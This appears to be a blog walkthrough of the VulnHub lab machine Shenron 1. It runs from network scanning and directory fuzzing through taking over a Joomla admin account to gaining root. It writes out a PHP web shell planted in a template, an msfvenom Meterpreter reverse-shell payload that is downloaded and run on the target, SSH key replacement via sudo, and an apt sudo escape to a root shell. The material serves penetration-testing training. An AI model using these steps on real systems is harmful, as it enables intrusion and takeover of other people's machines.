---
title: CTF Walkthrough for VulnHub Machine Shenron 1
date: 2024-09-03 00:00:00 +0300
categories: [Walkthrough, CTF]
tags: [vulnhub, writeup, shenron, machines, pentest]   
author: christ
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Shenron 1 which is the first machine of the Vulnhub Shenron series machines. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
This machine was set up using VirtualBox as recommended by the creator and the Network configuration was changed to 'Nat Network'.
### Description
Name: Shenron 1<br>
Goal: Get two flags<br>
Difficulty: Beginner to Intermediate<br>
Operating System: Linux<br>
Download link: [Shenron-1](https://download.vulnhub.com/shenron/shenron-1.ova)<br>
### Tools used
1) Nmap<br>
2) Netcat<br>
3) Metasploit Framework<br>
### Environment Set up
To ensure success as a penetration tester, staying organised is crucial. Proper organisation streamlines documentation and tracking of progress. In this workshop, we will create a directory tree to systematically manage our work, with detailed descriptions of each directory's purpose available here.
![Working Dir](https://raw.githubusercontent.com/ChristElise/christelise.github.io/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/working-dir.png)

## Reconnaissance
As in every penetration test, we need to identify our target on the network. We can do this by launching a quick host discovery scan against the network using Nmap. To perform the host verification we need to know our current subnet. We can perform this using the commands below:<br>
Current subnet identification: ```ip a```<br>
Host discovery scan: ```sudo nmap -sn 10.0.2.15/24```<br><br>
![Host Identification](https://raw.githubusercontent.com/ChristElise/christelise.github.io/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/target-dis.png)

After identifying our target on the network we need to know what services are run by our target to create different possible attack scenarios. We can start a service scan on our target using Nmap with the command ```sudo nmap -sV -sC  10.0.2.4 -oA services-dis```
![Service Scan](https://raw.githubusercontent.com/ChristElise/christelise.github.io/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/service-scan.png)

We can see that the target is running both an SSH server and an Apache web server. Web applications are known to contain many vulnerabilities so let's browse to the web application for further analyses. Unfortunately for us, we fall on the default Apache
![Wep App Index Page](https://raw.githubusercontent.com/ChristElise/christelise.github.io/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/web%20app%20index%20page.png)

In the real-world scenario, the default page might be left temporarily during the setup or testing phases of the web application. So let's try to find any hidden directories in the web application. I performed the fuzzing here using **ffuf** it can be done using your tool of preference.
Command used: ```ffuf -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.0.2.4/FUZZ```<br>
![Directory Fuzzing](https://raw.githubusercontent.com/ChristElise/christelise.github.io/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/dir-fuzzing-1.png)

The fuzzing process can uncover two interesting directories which are *test* and *joomla*. The directory joomla already gives us a hint that the web application may be running the well-known CMS Joomla. Let's browse these directories chronologically as they appeared during our fuzzing.
Browsing to the *test* directory we notice that directory listing is enabled which is a vulnerability in itself. We can note this vulnerability in our **Findings** folder. 
![Directory Listing](https://raw.githubusercontent.com/ChristElise/christelise.github.io/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/directory-listing.png)

We can also see a file having an interesting name i.e. *password*, accessing the file from our command line reveals to us a pair of credentials belonging to a certain admin user.
![File Accessed](https://raw.githubusercontent.com/ChristElise/christelise.github.io/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/file-accessed-1.png)

Nex let's visit the second directory *joomla* uncovered during our fuzzing. We can see that our target runs the well-known Joomla CMS. Remember that we uncover credentials hidden in the comments of the password file so, let's try this credential against the Joomla instance to check if they are valid.
*NB: Login to the administrative interface on Joomla is done by default in the **administrator** directory.*
![Joomla Login](https://raw.githubusercontent.com/ChristElise/christelise.github.io/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/joomla-login.png)

## Exploitation
We can see that we successfully login as the admin. After a successful login, we move to Extensions -> Templates -> Templates were can now attempt to add a PHP shell to one PHP file in an unused template. Here, we will choose the protostar template and add our basic PHP shell ```system($_GET["cmd"]);``` to the error.php file.
*NB: In a real-world penetration test try to use a more complicated name such as a hash for the GET parameter value. Anyone can access that file hence if a common name is used attackers may bruteforce it and also use it to establish their foothold in your client environment.*
![Template Modification](https://raw.githubusercontent.com/ChristElise/christelise.github.io/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/template-modification.png)
After modifying our template we can now execute commands on our target. ```curl http://10.0.2.4/joomla/templates/protostar/error.php?cmd=id```<br>
![RCE Test](https://raw.githubusercontent.com/ChristElise/christelise.github.io/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/rce-test.png)

This web shell is good but to facilitate our work, we will employ Meterpreter, a sophisticated payload integrated into the Metasploit Framework. To use a meterpreter on our target we first need to craft one using the msfvenom tool from the Metasploit Framework.
```msfvenom -p linux/x64/meterpreter_reverse_tcp  LHOST=10.0.2.15 LPORT=4444 -f elf > update.elf```<br>
![Payload Crafting](https://raw.githubusercontent.com/ChristElise/christelise.github.io/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/payload-crafting-1.png)
Now after crafting our payload we then start a small HTTP server to transfer the payload to our target using Python3 http.server module.
![Python Server](https://raw.githubusercontent.com/ChristElise/christelise.github.io/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/python-server-1.png)

We then use wget on our target to download to download the payload to the /tmp directory.
![Download Operation](https://raw.githubusercontent.com/ChristElise/christelise.github.io/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/download-operation-1.png)
Before executing our payload we need to configure our listener in Metasploit.
![Metasploit Set Up](https://raw.githubusercontent.com/ChristElise/christelise.github.io/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/metasploit-set-up.png)
After starting our listener we can now give execution permission to our payload and execute it.
![Payload Execution](https://raw.githubusercontent.com/ChristElise/christelise.github.io/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/payload-exec-1.png)
Going back to the listener, we can see that we caught a shell.
![Catching Shell](https://raw.githubusercontent.com/ChristElise/christelise.github.io/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/catching-shell-1.png)
After obtaining a shell as the web user it's a good habit to search for the *web.config* file in the web root directory which may contain credentials for the database user. In this machine the file is named **web.config.txt**, and reading its content reveals to us the credentials for the database user.<br> *NB: The name of this file may change depending on the preference of the web administrator.*
![Web Config File](https://raw.githubusercontent.com/ChristElise/christelise.github.io/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/web-root-dir.png)
![DB User Creds](https://raw.githubusercontent.com/ChristElise/christelise.github.io/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/db-creds.png)
We see that the credentials belong to the user **jenny** who is also a user on the target machine so let's try to authenticate as the user jenny.<br>
*Tip: To enumerate users on the system just cat the content of the /etc/passwd file*
![User Auth](https://raw.githubusercontent.com/ChristElise/christelise.github.io/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/user-auth-1.png)

We have identified that the user is susceptible to vulnerabilities arising from password reuse. With this password, we can directly try to identify if the user has any sudo rights.
![Sudo Right](https://raw.githubusercontent.com/ChristElise/christelise.github.io/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/sudo-right-1.png)

Great we see that the user Jenny can perform copy operations by using Shenron identity. Since we observed an SSH service running during our service enumeration let's try to replace the SSH key of Shenron by using the privileges offered to us by the sudo command.
We can generate a key pair \(private, public\) on our attack host and upload the public key using the same method used above or upload it using our powerful meterpreter.
![SSH Key Gen](https://raw.githubusercontent.com/ChristElise/christelise.github.io/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/ssh-key-gen-1.png)
After uploading the public key we can now replace the **authorized_keys** file in Shenron's **.ssh** directory by impersonating Shenron using our sudo rights and then afterward attempting to use the private key to log in as Shenron
![SSH Key Replace](https://raw.githubusercontent.com/ChristElise/christelise.github.io/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/ssh-key-replacement-1.png)
![SSH Login](https://raw.githubusercontent.com/ChristElise/christelise.github.io/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/ssh-login-1.png)
Great, we successfully logged in as Shenron we can now use this new account to read the user's flag and continue our enumeration of the system.
![User Flag](https://raw.githubusercontent.com/ChristElise/christelise.github.io/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/user-flag.png)
Some users tend to store their passwords in specific files so, let's try to enumerate all files having the string *password* in their names with the command ```find / -iname *password* 2>/dev/null```. We got a hit in the **/var/opt** directory. Reading the content of the files exposes to us what seems like Shenron's password.
![File Enum](https://raw.githubusercontent.com/ChristElise/christelise.github.io/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/file-enum-2.png)
We can now use that password to read Shenron's sudo rights
![Sudo Right](https://raw.githubusercontent.com/ChristElise/christelise.github.io/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/sudo-right-2.png)
We can observe that this account can be used to run apt with root privilege. Let's browse to [GTFOBins](https://gtfobins.github.io/gtfobins/apt/#sudo) to see how we can exploit this right to obtain a root shell. Here the command ```sudo /usr/bin/apt update -o APT::Update::Pre-Invoke::=/bin/sh``` can be used to obtain a root shell as demonstrated in the image.
![Root Access](https://raw.githubusercontent.com/ChristElise/christelise.github.io/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/root-access.png) 
Great we have obtained root access to the machine, having this access means we own the machine and can do whatever we want. 

## Conclusion
Great, in this walkthrough we have learned how a simple file listing vulnerability could be used to take over a machine. In a real-world assessment, the last step will be to gather our findings and draft a report for our clients. Thanks for following up the walkthrough.






